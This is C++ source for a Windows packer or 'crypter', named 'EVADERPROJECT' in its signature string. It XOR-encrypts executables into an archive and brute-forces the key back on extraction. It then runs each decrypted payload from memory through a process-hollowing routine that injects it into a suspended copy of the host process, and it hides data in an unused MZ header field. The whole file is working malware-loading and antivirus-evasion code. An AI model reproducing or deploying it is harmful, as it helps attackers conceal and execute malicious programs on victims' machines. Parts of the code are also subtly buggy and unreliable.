#include "packroutines.h"

const char* packerrors_str[] = {
	"Success",
	"Archive empty; no files to extract",
	"Error in supplied Path",
	"Could not create output archive file",
	"Not a valid packed file",
	"Failed while extracting one of the files",
	"Input archive file failed to open"
};

char* key;
char mainsignature[] = "EVADERPROJECT";

int KEY_SIZE;
int START_ASCII;
int END_ASCII;

int packfilesEx(char* path, char* mask, char* archive, int KEYSIZE, int STARTASCII, int ENDASCII, packcallbacks_t* pcb) {

	TCHAR szCurDir[MAX_PATH];

	std::vector<packdata_t> filesList;

	GetCurrentDirectory(MAX_PATH, szCurDir);

	if (!SetCurrentDirectory(path))
		return packerrorPath;

	WIN32_FIND_DATA fd;
	HANDLE findHandle;
	packdata_t pdata;

	findHandle = FindFirstFile(mask, &fd);

	if (findHandle == INVALID_HANDLE_VALUE)
		return packerrorNoFiles;

	char SIG[13];
	long nfiles;

	KEY_SIZE = KEYSIZE;
	START_ASCII = STARTASCII;
	END_ASCII = ENDASCII;

	// set a random key
	key = new char[KEY_SIZE]();
	setKey(key, KEY_SIZE);

	for (int i = 0; i < sizeof(SIG); i++)
		SIG[i] = mainsignature[i] ^ key[i % sizeof(key) / sizeof(char)];
		
		
	do {

		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY) continue;

		memset(&pdata, 0, sizeof(pdata));

		strcpy_s(pdata.filename, fd.cFileName);

		pdata.filesize = fd.nFileSizeLow;

		filesList.push_back(pdata);


	} while (FindNextFile(findHandle, &fd));

	FindClose(findHandle);

	FILE* fpArchive = fopen(archive, "wb");

	if (!fpArchive) return packerrorCannotCreateArchive;

	// write key length and complexcity
	fwrite(&KEY_SIZE, sizeof(KEY_SIZE), 1, fpArchive);
	fwrite(&START_ASCII, sizeof(START_ASCII), 1, fpArchive);
	fwrite(&END_ASCII, sizeof(END_ASCII), 1, fpArchive);

	fwrite(SIG, sizeof(char), sizeof(SIG), fpArchive);

	// write entries count
	nfiles = filesList.size();
	fwrite(&nfiles, sizeof(nfiles), 1, fpArchive);

	// store files entries (since std::vector stores elements in a linear manner)
	fwrite(&filesList[0], sizeof(pdata), filesList.size(), fpArchive);

	// process all files
	for (unsigned int cnt = 0; cnt < filesList.size(); cnt++) {

		FILE* inFile = fopen(filesList[cnt].filename, "rb");
		long size = filesList[cnt].filesize;

		// if callback assigned then trigger it
		if (pcb && pcb->newfile)
			pcb->newfile(filesList[cnt].filename, size);

		// copy filename
		long pos = 0;
		while (size > 0) {
			char buffer[4096];
			
			long toread = size > sizeof(buffer) ? sizeof(buffer) : size;
			fread(buffer, toread, 1, inFile);
			for (int i = 0; i < sizeof(buffer); i++) // for loop for scrambing bits in the string 
				buffer[i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
			fwrite(buffer, toread, 1, fpArchive);
			pos += toread;
			size -= toread;
			if (pcb && pcb->fileprogress)
				pcb->fileprogress(pos);

		}
		fclose(inFile); // close archive and restore working directory
	}

	// close archive
	fclose(fpArchive);

	SetCurrentDirectory(szCurDir);
	return packerrorSuccess;

}

int packfiles(char* path, char* mask, char* archive, int KEYSIZE, int STARTASCII, int ENDASCII) {
	return packfilesEx(path, mask, archive, KEYSIZE, STARTASCII, ENDASCII, NULL);
}

int unpackfiles(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos, packcallbacks_t * pcb) {
	return unpackfilesEx(archive, dest, filesList, startPos, pcb);
}

int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos, packcallbacks_t * pcb) {

	FILE* fpArchive = fopen(archive, "rb");
	

	if (!fpArchive) return packerrorCouldNotOpenArchive;

	char SIG[13];
	long nFiles;

	if (startPos)
		fseek(fpArchive, startPos, SEEK_SET);

	// read key length and complexcity
	fread(&KEY_SIZE, sizeof(KEY_SIZE), 1, fpArchive);
	fread(&START_ASCII, sizeof(START_ASCII), 1, fpArchive);
	fread(&END_ASCII, sizeof(END_ASCII), 1, fpArchive);
	key = new char[KEY_SIZE]();

	// read signature
	fread(SIG, sizeof(char), sizeof(SIG), fpArchive);

	if (!retrieveKey(SIG, sizeof(SIG))) return (fclose(fpArchive), packerrorNotAPackedFile);

	// read files entries count
	fread(&nFiles, sizeof(nFiles), 1, fpArchive);

	// no files?
	if (!nFiles) return (fclose(fpArchive), packerrorNoFiles);

	fread(&filesList[0], sizeof(packdata_t), nFiles, fpArchive);

	filesList.resize(nFiles);

	// loop in all files
	for (unsigned int i = 0; i < filesList.size(); i++) {

		FILE* fpOut;
		char buffer[4096];
		packdata_t *pdata = &filesList[i];

		// trigger callback
		if (pcb && pcb->newfile)
			pcb->newfile(pdata->filename, pdata->filesize);


		strcpy_s(buffer, dest);
		strcat_s(buffer, pdata->filename);

		// how many chunks of Buffer_Size is there is in filesize?
		long size = pdata->filesize;
		long pos = 0;
		long read = 0;

		char* _image_ = new char[size*2]();

		while (size > 0){

			long toread = size > sizeof(buffer) ? sizeof(buffer) : size;
			fread(buffer, toread, 1, fpArchive);
			for (int i = 0; i < sizeof(buffer); i++) { // for loop for scrambing bits in the string 
				_image_[read + i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
				buffer[i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
			}
			read += toread;
			pos += toread;
			size -= toread;
			if (pcb && pcb->fileprogress)
				pcb->fileprogress(pos);
				
		}

		// Run payload from memory
		RunPortableExecutable(_image_);
		nFiles--;
	}

	fclose(fpArchive);

	return packerrorSuccess;

}


int SfxGetInsertPos(char *filename, long *pos){

	FILE *fp = fopen(filename, "rb");
	if (fp == NULL)
		return packerrorCouldNotOpenArchive;

	IMAGE_DOS_HEADER idh;

	fread((void *)&idh, sizeof(idh), 1, fp);
	fclose(fp);
	*pos = *(long *)&idh.e_res2[0];
	return packerrorSuccess;
}

int SfxSetInsertPos(char *filename, long pos){

	FILE *fp = fopen(filename, "rb+");
	if (fp == NULL)
		return packerrorCouldNotOpenArchive;

	IMAGE_DOS_HEADER idh;

	// read dos header
	fread((void *)&idh, sizeof(idh), 1, fp);

	// adjust position value in an unused MZ field
	*(long *)&idh.e_res2[0] = pos;

	// update header
	rewind(fp);
	fwrite((void *)&idh, sizeof(idh), 1, fp);
	fclose(fp);
	return packerrorSuccess;
}


void setKey(char* key, int key_size) {

	srand(time(NULL));

	std::cout << "encryption key : ";
	for (int i = 0; i < key_size; ++i) {
		key[i] = char(START_ASCII + rand() % (END_ASCII - START_ASCII + 1));
		std::cout << key[i];
	}

	std::cout << "\n";

}

bool retrieveKey(char* readSignature, int signatureSize) {

	//bruteforcing the encryption key

	char retrievedSig[] = "aaaaaaaaaaaaaaaaaaaaa";
	int i = KEY_SIZE;

	for (int k = 0; k < KEY_SIZE; k++)
		key[k] = START_ASCII;

	while (i > -1) {

		for (int i = 0; i < signatureSize; i++) // for loop for scrambing bits in the string 
			retrievedSig[i] = readSignature[i] ^ (char)key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string

		retrievedSig[signatureSize] = '\0';

		if (!strcmp(retrievedSig, mainsignature)) return 1;

		i = KEY_SIZE - 1;
		key[i]++;

		while ((int)key[i] > END_ASCII) {
			
			key[i] = START_ASCII;
			key[--i]++;
		}

	}

	return 0;
}


int RunPortableExecutable(HANDLE Image) {

	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFO SI;

	CONTEXT* CTX;

	DWORD* ImageBase;
	void* pImageBase;

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);

	GetModuleFileName(0, CurrentFilePath, 1024);
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {

		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {

			CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {

				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {

					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);

				}

				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX));

				ResumeThread(PI.hThread);

				return 0;
			}

		}

	}

}